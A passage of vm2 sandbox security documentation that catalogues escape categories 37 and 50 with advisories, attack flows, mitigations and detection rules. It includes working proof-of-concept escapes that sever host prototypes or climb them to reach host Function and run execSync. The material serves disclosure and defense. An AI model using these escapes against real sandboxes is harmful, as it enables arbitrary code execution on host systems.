Interaction with [Category 8 / GHSA-m5q2-4fm3-vfqp](host-reference-primitives.md#attack-category-8-cross-realm-symbol-extraction-from-host-objects): the m5q2 fix expanded `Symbol.for` to deny the entire `nodejs.` namespace **and** added an `isDangerousCrossRealmSymbol(key)` rejection inside the `set` / `defineProperty` / `deleteProperty` traps themselves. That symmetric symbol guard fires before the receiver-mismatch check below, so the canonical symbol-key PoC (variant 1) is now structurally blocked at two independent layers even on a sandbox lacking this category's fix. The receiver bug remains a real, generic write-channel — variants 2–5 (plain string keys, forged `Reflect.set` receiver, deep proto chains, `Object.assign(child, src)`) reach the host write path without involving any cross-realm symbol — so this category's fix is required defense-in-depth on top of m5q2 rather than a duplicate of it.

### Mitigation

Restores [Defense Invariant 1](../ATTACKS.md#defense-invariants) ("no host-realm object reaches sandbox code unwrapped") and makes an until-then implicit corollary explicit: **a sandbox-originated write reaches a host-realm object only when the spec `[[Set]]` receiver equals the canonical bridge proxy for that object's target.**

`lib/bridge.js`, `BaseHandler.set` (after the existing `__proto__` and `constructor`-on-array short-circuits, before the host-write forwarding):

```javascript
const canonicalProxy = thisReflectApply(thisWeakMapGet, mappingOtherToThis, [object]);
if (receiver !== canonicalProxy) {
    return thisReflectDefineProperty(receiver, key, {
        __proto__: null,
        value: value,
        writable: true,
        enumerable: true,
        configurable: true,
    }) === true;
}
```

The lookup reuses `mappingOtherToThis`, which `thisProxyOther` already populates with `[other, proxy]` (`!isHost`) or `[other, proxy2]` (`isHost`). In the host-loaded branch the *outer* `proxy2` is the sandbox-facing object; its empty handler forwards `[[Set]]` to `proxy` while preserving `Receiver`, so the BaseHandler trap fires with `Receiver === proxy2`. Both branches therefore yield a single canonical proxy per host target, and direct sandbox writes (`hostProxy.x = v`, `Reflect.set(hostProxy, k, v, hostProxy)`, `Object.assign(hostProxy, src)`) continue to take the legitimate `otherReflectSet` path. Non-canonical receivers — `Object.create(proxy)` children, explicit-receiver `Reflect.set` calls, sandbox-side `setPrototypeOf` constructions — install on the receiver itself via `Reflect.defineProperty`, exactly as the spec mandates.

The fix is symmetric with `ReadOnlyHandler.set` (which uses the same install-on-receiver shape unconditionally) and with the function-value branch of `ProtectedHandler.set`. `ProtectedHandler.set` inherits the fix automatically through its `super.set` delegation for non-function values.

### Detection Rules

- **`Object.create(hostProxy)` followed by property assignment on the child** — every form: `child[k] = v`, `Reflect.set(child, k, v)`, `Object.defineProperty(child, k, desc)` (the last installs on `child` directly and does not route through the trap, so it is not relevant; the first two are).
- **`Reflect.set(hostProxy, k, v, receiver)` where `receiver !== hostProxy`** — explicit-receiver writes against any host object.
- **`Object.assign(Object.create(hostProxy), src)`** — bulk pollution via the receiver-mismatch primitive.
- **Code review pattern**: sandbox code that calls `Object.create` on any embedder-exposed object is suspicious; benign sandbox code virtually never needs to inherit from host objects.

### Considered Attack Surfaces

- **`Reflect.set(hostProxy, k, v, hostProxy)`** — receiver matches the canonical proxy, goes through the legitimate write path. Equivalent to `hostProxy[k] = v`. Existing `isProtectedHostObject` and `__proto__` short-circuits still apply.
- **`Reflect.set(hostProxy, k, v, undefined)` / `null`** — receiver does not strict-equal the canonical proxy → install-on-receiver branch fires → `Reflect.defineProperty(undefined, …)` throws a `TypeError`, the sandbox sees a `TypeError`, the host object is untouched.
- **Adversary-controlled Proxy receiver with a custom `defineProperty` trap** — vm2 does not expose the `Proxy` constructor to the sandbox in plain VM mode (`typeof Proxy === 'undefined'`), so this composition is not reachable today. If a future change exposes `Proxy`, the install-on-receiver branch must be re-audited.
- **`setPrototypeOf(child, hostProxy)` after `child` already has writes** — the next write on `child` walks the new prototype, fires the trap with `Receiver = child`, and installs on `child`. Host untouched.
- **`BaseHandler.defineProperty`** — `[[DefineOwnProperty]]` carries no `Receiver` per ECMA-262 §9.5.6; `Object.defineProperty(child, k, desc)` where `child` inherits from `hostProxy` installs on `child` directly without invoking the proxy's `defineProperty` trap. No analogous receiver bug exists. (`Object.defineProperty(hostProxy, k, desc)` *does* route to the trap, but that path already has the `isProtectedHostObject` short-circuit from GHSA-vwrp-x96c-mhwq.)
- **`BaseHandler.deleteProperty`** — `[[Delete]]` (§9.5.10) has no `Receiver`. `delete child.k` for `child` inheriting from proxy is a no-op on the proxy.
- **Compound with [Category 18: Array Species Self-Return](host-reference-primitives.md#attack-category-18-array-species-self-return-via-constructor-manipulation)** — `Object.create(hostArray).constructor = fn` now installs `constructor` on the sandbox child rather than (as before the existing array-constructor short-circuit) on the proxy target. The host array's raw `constructor` slot remains untouched in either case; `neutralizeArraySpeciesBatch` continues to defend the species path independently.

---

## Attack Category 37: Stacked Indirection Bypass of Host Prototype Mutator Peel

**Advisories**: GHSA-v6mx-mf47-r5wg, GHSA-cfcw-xp6x-25gj

**Tests**: test/ghsa/GHSA-v6mx-mf47-r5wg/, test/ghsa/GHSA-cfcw-xp6x-25gj/

**Uses**: [Category 30: Host Prototype Mutation via Bridged Setter Primitives](host-prototype-mutation.md#attack-category-30-host-prototype-mutation-via-bridged-setter-primitives).

**Supersedes**: extends [Category 30](host-prototype-mutation.md#attack-category-30-host-prototype-mutation-via-bridged-setter-primitives) — the depth-1 indirection peel introduced there is the bypass surface.

### Description

The GHSA-v6mx-mf47-r5wg fix added an apply-trap guard that peels **one** layer of `Function.prototype.call` / `Function.prototype.apply` / `Function.prototype.bind` / `Reflect.apply` / `Reflect.construct` indirection: when the apply target is one of those primitives, the trap unwraps `context` (or `args[0]` for `Reflect.apply`) and checks the underlying function against `dangerousHostProtoMutators`. An attacker who stacks **two** layers of indirection defeats that peel because the peel inspects only one position. PoC:

```javascript
// (advisory GHSA-cfcw-xp6x-25gj)
Buffer.call.call(Buffer.call, setProto, target, null);
```

In the bridge apply trap this surfaces as:

- `object` = host `Function.prototype.call` (outer `.call`)
- `context` = host `Function.prototype.call` (the receiver `Buffer.call`)
- `args` = `[setProto, target, null]`

The depth-1 peel unwraps `context` → `Function.prototype.call`, which is itself an indirection primitive and **not** in the dangerous-mutator set. The check passes; V8 unfolds the chain inside a single host call without re-entering the apply trap; the inner `Function.prototype.call` invokes `setProto.[[Call]](target, [null])`, severing the host prototype as in Category 30. Once the prototype is severed, the canonical `e.constructor.constructor` pivot to host `Function` works.

CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. Obtain references to host `Object.prototype.__proto__` accessor: `setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, "__proto__")`, `getProto` analogously.
2. Trigger a host-realm rejection (`await WebAssembly.compileStreaming()`).
3. In `catch (e)`, sever the host prototype via the **double-indirection** form: `Buffer.call.call(Buffer.call, setProto, getProtoOf(e), null)`. The depth-1 v6mx peel sees only `Function.prototype.call` as the underlying and allows the call through.
4. Trigger a second host-realm rejection. The bridge's read-side defense (Category 30 Layer B — cache check in `thisEnsureThis`) catches values that have already crossed via the bridge, but the freshly-thrown host `TypeError` has not crossed yet; with its prototype chain severed, the proto-walk falls through and `ensureThis` returns the raw host value.
5. `e.constructor.constructor` → host `Function` → `new HostFunction("return process")()` → RCE.

### Canonical Example

```javascript
// (advisory GHSA-cfcw-xp6x-25gj)
const { VM } = require("vm2");
const vm = new VM();
vm.run(`
  const getProto = Buffer.call.call(Buffer.call, {}.__lookupGetter__, Buffer, "__proto__");
  const setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, "__proto__");
  async function f() {
    try { await WebAssembly.compileStreaming(); }
    catch(e) {
      Buffer.call.call(Buffer.call, setProto,
        Buffer.call.call(Buffer.call, getProto, e), null);
    }
    try { await WebAssembly.compileStreaming(); }
    catch(e) {
      e.constructor.constructor("return process")()
        .mainModule.require('child_process').execSync('touch pwned');
    }
  }
  f();
`);
```

### Why It Works

The v6mx peel is positional: it inspects exactly one layer of indirection (`object` is `F.p.call`, look at `context`). A second layer pushes the dangerous function out of that position — `context` is now `F.p.call`, and the dangerous function is in `args[0]`. V8's spec for `F.p.call.[[Call]](thisArg, args)` is `thisArg.[[Call]](args[0], args.slice(1))`, so a chain of N `.call`s consumes N arguments before reaching the actual function — and V8 unfolds the chain inside a single host call without re-entering any sandbox proxy trap.

Adding deeper positional peeling would be an arms race: 3-layer (`F.p.call.call.call(...)`), mixed `.call`/`.apply`/`Reflect.apply`, and `.bind`-then-invoke chains all need their own positional handling. The structural answer is to deny the **reference**, not the **invocation**: refuse to ever deliver a callable host prototype mutator into the sandbox, so no number of indirection wrappers can resurrect the primitive.

### Mitigation

**Structural fix in `lib/bridge.js`** — refuse to deliver any raw host prototype mutator across the bridge at any of the three value-crossing chokepoints. The dangerous-mutator set is already populated at bridge init by the v6mx fix; this category extends its use from "invocation check" to "delivery check":

- `thisFromOtherWithFactory` — the main host→sandbox value path. Apply-trap return values, `get`-trap property reads, `getOwnPropertyDescriptor` `.set`/`.get` projections, and iterator yields all funnel through here.
- `thisFromOtherForThrow` — host throw values delivered into sandbox catch blocks.
- `thisEnsureThis` — `this`-coercion / catch-binding re-entry path.

In each, **after** the `mappingOtherToThis` cache check, return `emptyFrozenObject` if `other` matches `isDangerousHostProtoMutator`:

```javascript
if (!isHost && isDangerousHostProtoMutator(other)) {
  return emptyFrozenObject;
}
```

This mirrors the existing handling for dangerous Function constructors (`isDangerousFunctionConstructor`) in the same chokepoints. The cache-check ordering is critical: `connect()` already registered safe sandbox-realm surrogates for `Object.prototype.__defineGetter__` / `__defineSetter__` (see `localObject.prototype.__defineGetter__` etc. in `lib/setup-sandbox.js`). A cache hit returns the surrogate, preserving the legitimate sandbox API. Only the **uncached, raw host references** — exactly what the attacker needs — are filtered.

After this fix:

- `const setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, "__proto__")` assigns `emptyFrozenObject` (the host setter never crosses the bridge).
- Any subsequent `setProto.call(...)`, `setProto.apply(...)`, `setProto.bind(...)`, or `Reflect.apply(setProto, ...)` synchronously throws `TypeError: setProto.call is not a function` — the sandbox cannot apply a non-callable through any number of indirection wrappers.
- N-layer indirection, mixed `.call`/`.apply`/`.bind`/`Reflect.apply`, future built-ins that act as `.call` substitutes, and descriptor-projection reads all collapse at the same upstream filter. The root primitive — holding a reference — is gone.

The v6mx apply-trap peel remains in place as a complementary invocation-side check. The two layers (delivery refusal + apply-trap refusal) cover both "sandbox holds the reference and tries to apply it" and "sandbox somehow acquires the reference through a path that bypasses delivery". This restores **[Defense Invariant #1](../ATTACKS.md#defense-invariants)** ("Never expose host constructors or prototypes") at the value-crossing chokepoint rather than at the call-site, eliminating positional dependency.

### Detection Rules

- **Sandbox reads any property whose value would be a host prototype mutator** — `Reflect.getOwnPropertyDescriptor`, `Object.getOwnPropertyDescriptors`, `__lookupSetter__`, `__lookupGetter__` results, descriptor `.set`/`.get` projections. All funnel through `thisFromOtherWithFactory`.
- **Sandbox catches a host throw value that resolves to a host prototype mutator** — covered by `thisFromOtherForThrow`.
- **Sandbox catch-binding re-entry with a host prototype mutator** — covered by `thisEnsureThis`.
- **Sandbox calls `({}).__lookupSetter__('__proto__')` or `({}).__lookupGetter__('__proto__')` and assigns the result** — the result is now `emptyFrozenObject`, not the host accessor. Detection: assignment value is `Object.isFrozen(x) && Object.keys(x).length === 0 && typeof x !== 'function'`.

### Considered Attack Surfaces

- **Future indirection primitives** — any host built-in that V8 might add later, or that a Node version surfaces, that transitively invokes a function on its `this`. The delivery filter is layer-count and primitive-name independent; the underlying reference never crosses into the sandbox.
- **Apply-trap target/context confusion** — if a future bug lets sandbox code reach the apply trap with the dangerous mutator as `args[0]` for a non-`Reflect.apply` target (e.g., a new `Function.prototype.applyN`), the v6mx peel would not match. The delivery filter does not depend on target-vs-context positioning, so this composition is also closed.
- **`Object.setPrototypeOf` on sandbox-realm targets** — not in the dangerous-mutator set (only host-realm copies are). Sandbox code can still mutate its own prototypes freely via the sandbox-realm `Object.setPrototypeOf`, which is a different function identity from the host's.
- **`Object.defineProperty` on sandbox-realm targets** — same reasoning. Sandbox-realm `Object.defineProperty` continues to work normally.
- **`__defineGetter__` / `__defineSetter__` on sandbox objects** — the `connect()`-registered sandbox surrogates are returned via the `mappingOtherToThis` cache hit before the filter fires. Preserves the issue #176 regression behavior.

### Related Categories

- [Category 30: Host Prototype Mutation via Bridged Setter Primitives](host-prototype-mutation.md#attack-category-30-host-prototype-mutation-via-bridged-setter-primitives) — direct ancestor. v6mx introduced the dangerous-mutator set and the depth-1 apply-trap peel; this category extends the same set's use to delivery refusal.
- [Category 26: Sandbox-Realm Null-Proto via Bridge `from()` Set-Trap Write-Through](host-prototype-mutation.md#attack-category-26-sandbox-realm-null-proto-via-bridge-from--set-trap-write-through) — explains why the cache-check must come first in each chokepoint (sandbox-realm surrogates are returned by the cache hit before the filter applies).

### Follow-Up Bypass: Host-Side Laundering via `bind` + Host Higher-Order Method (GHSA-cfcw-xp6x-25gj, 2026-05-25)

The delivery-refusal and apply-trap-peel defenses above are both **identity-based**: they recognize the host indirection primitives (`Function.prototype.{call,apply,bind}`, `Reflect.{apply,construct}`) and the host prototype mutators by reference. The reporter defeated both by never holding the dangerous reference as a sandbox value and never re-crossing the bridge during the dangerous invocation:

```javascript
// (advisory GHSA-cfcw-xp6x-25gj, follow-up)
const ca = Buffer.call.call(Buffer.bind, Buffer.apply, Buffer.call, Buffer.call);
// ca === host Function.prototype.apply.bind(call, call) — a FRESH host function
// identity, in NEITHER applyIndirectionPrimitives NOR dangerousHostProtoMutators.
function caar(a){ const r = Buffer.of().toJSON().data; r[0] = a; return r.map(ca); }
// r is a GENUINE host array; r.map(ca) runs host Array.prototype.map, which calls
// the host ca callback host-side. __lookupSetter__ and the __proto__ setter run
// entirely in the host realm — ZERO bridge crossings to inspect.
async function f() {
  try { await WebAssembly.compileStreaming(); }
  catch (e) {
    const g = caar([{}.__lookupGetter__, Buffer, "__proto__"]); g[1] = e;
    const s = caar([{}.__lookupSetter__, Buffer, "__proto__"]); s[1] = ca(g); s[2] = null;
    ca(s);                          // severs the host error prototype chain, host-side
  }
  try { await WebAssembly.compileStreaming(); }
  catch (e) { e.constructor.constructor("return process")()...; }
}
```

**Why it works:** `Function.prototype.bind` mints a *fresh* host function identity (`ca`) that bakes the indirection internally, so neither identity set matches it. Seeding a genuine host array (`Buffer.of().toJSON().data`) and invoking host `Array.prototype.map(ca)` runs the host applicator **host-side** — the dangerous `__proto__` setter executes in the host realm with no bridge apply trap on the path. Instrumenting the apply trap shows **zero** host applies of any dangerous/indirection primitive: the whole chain is laundered host-side. Both prior defenses inspect values *crossing* the bridge; this composes entirely *around* the bridge. The severed host error then surfaces in the second `catch`, where `e.constructor.constructor` reaches host `Function`.

**Mitigation — mechanism-independent payoff hardening.** Rather than chase the laundering mechanism (an arms race: `bind`-derivatives, then `Reflect.apply`-derivatives, then every host higher-order method), close the **payoff**. The escape's terminal requirement is invariant across all severance mechanisms: a **raw host-realm object with a severed prototype chain must surface in sandbox code**. Two independent layers refuse exactly that:

1. **`lib/bridge.js` `thisEnsureThis`** — the sole chokepoint that returns a host object *raw* on proto-walk fall-through (`thisFromOtherForThrow` and `thisFromOtherWithFactory` proxy instead). During the walk, track whether the chain passes through the sandbox `Object.prototype` (`thisObjectPrototype`). Every genuine sandbox-realm value's chain terminates there; a severed host object walks to `null` without ever seeing it. On fall-through, if `!sawSandboxObjectProto`, return `emptyFrozenObject`.
2. **`lib/setup-sandbox.js` `handleException`** — the sole sanitizer the transformer routes every caught value through. `isForeignSeveredHostValue(e)` applies the same discriminator (chain reaches `null` without hitting the sandbox `Object.prototype`, captured at module load and unforgeable from inside the sandbox); if true, replace the value with a benign sandbox `Error`. Primordial `Object.create(null)` values (immediate null proto) are explicitly exempt, preserving GHSA-9vg3 behavior.

Both layers are **mechanism-independent** — they do not care *how* the chain was severed (direct bridge call, stacked indirection, or fully host-side `bind`/`map` laundering), only that the result is a foreign severed host object. Either layer alone blocks the escape; they sit at independent chokepoints (bridge re-entry vs. transformer catch sanitizer). The discriminator is sound because the raw sandbox `Object.prototype` only exists in the sandbox realm — host-side code can never hold it (it crosses the bridge as a proxy), so a host object's chain can never falsely appear to pass through it. This restores **[Defense Invariant #1](../ATTACKS.md#defense-invariants)** ("Never expose host constructors or prototypes") at the *payoff* — the universal `e.constructor.constructor === host.Function` pivot — independent of the delivery or invocation mechanism, and **supersedes** the positional v6mx peel and the identity-based delivery refusal for the severance-payoff class (both retained as complementary earlier-layer defenses).

A rejected alternative was tracking `bind`-derivatives of the applicators in the apply trap (refuse any `bind`-of-an-applicator as call target/`this`/argument). It blocks the laundering earlier but is mechanism-specific (a novel host-side execution vector that does not use `bind`-of-applicator would slip), higher-collateral on legitimate `.call`/`.apply`/`.bind`, and unnecessary given the payoff hardening already closes the class.

---

## Attack Category 50: Host Prototype-Chain Climb via Raw `__proto__` Getter (Reader Side)

**Advisories**: GHSA-88hf-g992-jg85

**Tests**: test/ghsa/GHSA-88hf-g992-jg85/

**Uses**: [Category 2: Prototype Chain Manipulation](host-reference-primitives.md#attack-category-2-prototype-chain-manipulation), [Category 20: Host Intrinsic Prototype Pollution via Bridge Write Traps](host-prototype-mutation.md#attack-category-20-host-intrinsic-prototype-pollution-via-bridge-write-traps), [Category 30: Host Prototype Mutation via Bridged Setter Primitives](host-prototype-mutation.md#attack-category-30-host-prototype-mutation-via-bridged-setter-primitives).

Advisory: GHSA-88hf-g992-jg85 (NodeVM default config). The reader-side analog of the GHSA-v6mx / GHSA-cfcw setter work.

### Description

The bridge deliberately **flattens** the host prototype chain. When a host object is wrapped, its proxy's target `[[Prototype]]` is set so that `getPrototypeOf` (and the `.__proto__` / `Object.getPrototypeOf` read paths, all of which route through the `getPrototypeOf` trap) reports the host value as inheriting directly from the sandbox `Object.prototype`, then `null`. The intermediate host builtin prototypes — `Socket.prototype`, `Duplex.prototype`, `Readable.prototype`, `Stream.prototype`, `EventEmitter.prototype` — are **invisible** to sandbox code.

This flattening is load-bearing: those intermediate host prototypes are **not** in `protectedHostObjects` (only cached JS intrinsic prototypes + constructors are). If sandbox code could reach one as a bridge proxy, `BaseHandler.set` would forward a write straight to the raw host object — e.g. `EventEmitter.prototype.emit = fn`.

The escape pierces the flattened view by extracting the **raw host `Object.prototype.__proto__` getter** and invoking it directly. `gP.call(x)` bypasses the `getPrototypeOf` trap and returns the *true* host `[[Prototype]]` of `x`, freshly wrapped — exposing each intermediate host prototype one hop at a time. GHSA-v6mx/cfcw classified the `__proto__` **setter** (a mutator) as dangerous but left the **getter** (a reader) deliverable.

CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. Extract the raw host getter: `const gP = Buffer.call.call(({}).__lookupGetter__, 67, '__proto__');`. Host `Function.prototype.call` unwraps the `connect()`-mapped sandbox `__lookupGetter__` to its host counterpart, which (invoked host-side with `this = 67`) walks host `Number.prototype → Object.prototype` and returns the host `__proto__` getter. It crosses back and is wrapped as a callable bridge proxy.
2. Climb: starting from a host object reachable in NodeVM (`console._stdout`), repeatedly call `gP.call(cur)`. Each call returns the raw host `[[Prototype]]` — Socket → Duplex → Readable → Stream → `EventEmitter.prototype` — as a fresh, writable bridge proxy.
3. Write a sandbox function onto the reached host prototype: `EventEmitter.prototype.emit = fn`. `EE.prototype` is not protected, so `BaseHandler.set` forwards the write to the real host object.
4. Later, any host `process.emit(...)` / `console.log(...)` invokes the sandbox `emit` with `this === host object` → arbitrary host code execution.

### Canonical Example

```javascript
// GHSA-88hf-g992-jg85
const { NodeVM } = require("vm2");
new NodeVM().run(`
  const gP = Buffer.call.call(({}).__lookupGetter__, 67, '__proto__');
  let cur = console._stdout, ee = null;
  for (let i = 0; i < 25; i++) {
    const p = gP.call(cur);
    if (!p) break;
    if (Object.prototype.hasOwnProperty.call(p, 'emit')) { ee = p; break; }
    cur = p;
  }
  ee.emit = function () { /* runs later with host 'this' */ };
`);
```

Laundering variants (all closed): `Buffer.apply.apply(g, [Buffer, ['__proto__']])`, `Reflect.apply`-based extraction, and the GHSA-cfcw `map`/`bind` host-side applicator `ca` — every one still needs a host-invocable proto-reader **as a value** to climb, and all such readers are denied delivery.

### Why It Works

The `getPrototypeOf` trap returns a flattened chain; but a *directly invoked* raw host getter is a plain host function call whose result is the un-flattened host prototype. The prior mutator defenses (`dangerousHostProtoMutators`) covered only the write primitive. Reading a prototype was deemed harmless — but the reader hands the sandbox a *writable* proxy of a non-intrinsic host prototype, and non-intrinsic host prototypes are outside `protectedHostObjects`.

### Mitigation

`lib/bridge.js`: classify the raw host **proto-readers** as dangerous-to-**deliver**, symmetric to the mutator set. A new identity set `dangerousHostProtoReaders` is populated at bridge init with the host `Object.prototype.__proto__` getter, host `Object.getPrototypeOf`, and host `Reflect.getPrototypeOf`. `isDangerousHostProtoReader(other)` is consulted **after** the `mappingOtherToThis` cache short-circuit in the three host→sandbox delivery chokepoints — `thisFromOtherWithFactory`, `thisEnsureThis`, `thisFromOtherForThrow` — and returns `emptyFrozenObject` (a non-callable; its `.call` is `undefined`). The `apply` trap additionally refuses invocation of a reader (direct, one-layer `Function.prototype.{call,apply,bind}` peel, and `Reflect.{apply,construct}`) as defense-in-depth.

Because the sandbox can never hold a host-invocable proto-reader, it cannot pierce the flattened view by **any** composition — direct, stacked indirection, or host-side laundering (laundering still needs the reader as an array element, which is denied). Cache-first ordering preserves any `connect()`-registered sandbox surrogate. Legitimate `Object.getPrototypeOf(hostProxy)` / `hostProxy.__proto__` / `Reflect.getPrototypeOf(hostProxy)` keep working: they use the **sandbox-realm** intrinsics and route through the `getPrototypeOf` trap, returning the flattened wrapped proto — they never extract or invoke the raw host reader. Enforces [Defense Invariant](../ATTACKS.md#defense-invariants): host callables that read/climb host prototype chains outside the `getPrototypeOf` trap must never reach the sandbox.

**Second layer — the write-side payoff (defense-in-depth).** Independent of *how* a host prototype is reached, the escape only pays off when the sandbox plants a **callable** on a shared host prototype so the host later invokes it with a foreign `this`. That payoff is closed structurally too: host `[[Prototype]]` objects are marked at delivery time (`looksLikeHostPrototype` — an object that owns a data `constructor` whose `.prototype` points back at it, read via `otherSafeGetOwnPropertyDescriptor` so no host getter fires), recorded eagerly in `hostObjectsUsedAsPrototype` before any sandbox write can run. `BaseHandler.set` and `BaseHandler.defineProperty` then divert **function values and accessor descriptors** written to a marked prototype onto the sandbox-side proxy target instead of `otherReflectSet`/`otherReflectDefineProperty`-ing them onto the raw host object. Marking is indirection-independent (decided by the object's shape at delivery, not by how it was obtained) and persistent (later `constructor` corruption cannot clear a mark). Two properties keep the embedder contract intact: **data** writes always flow through to the host, and **leaf** host objects handed to the sandbox are never marked (their `constructor` is inherited, not own), so `test/vm.js`'s `freeze, protect > without freeze` — where the sandbox installs a function on an exposed host object the host reads back — still holds. Either layer alone blocks the canonical PoC; together they close the read primitive *and* the write payoff for any future read path.

### Detection Rules

- **`__lookupGetter__` / `Object.getOwnPropertyDescriptor(..., '__proto__').get` composed with `Buffer.call` / `Buffer.apply` / `Reflect.apply`** — the raw-getter extraction primitive.
- **Repeated single-hop `getter.call(x)` producing objects with `own` builtin-prototype methods (`emit`, `pipe`, `write`)** — a raw-chain climb, distinct from the flattened `Object.getPrototypeOf` walk that terminates at `Object.prototype`.
- **A write of a function value onto any object reached through such a climb** — the payoff sink; the reached object is a host builtin prototype outside `protectedHostObjects`.

### Considered Attack Surfaces

- **Direction (B) — protecting the reachable host-prototype set instead of denying the reader**: rejected. Enumerating every non-intrinsic host prototype at init is impossible, and protecting them at the apply-trap result site (à la the v6mx peel) is defeated by host-side `map`/`bind` laundering exactly as the peel was. Denying the reader at *delivery* is the complete, laundering-independent chokepoint.
- **`Object.getPrototypeOf` / `Reflect.getPrototypeOf` as data-property readers**: not currently extractable as raw host references via `__lookupGetter__` (they are data properties, not accessors), but added to `dangerousHostProtoReaders` defensively so any future host return path that surfaces them is denied.
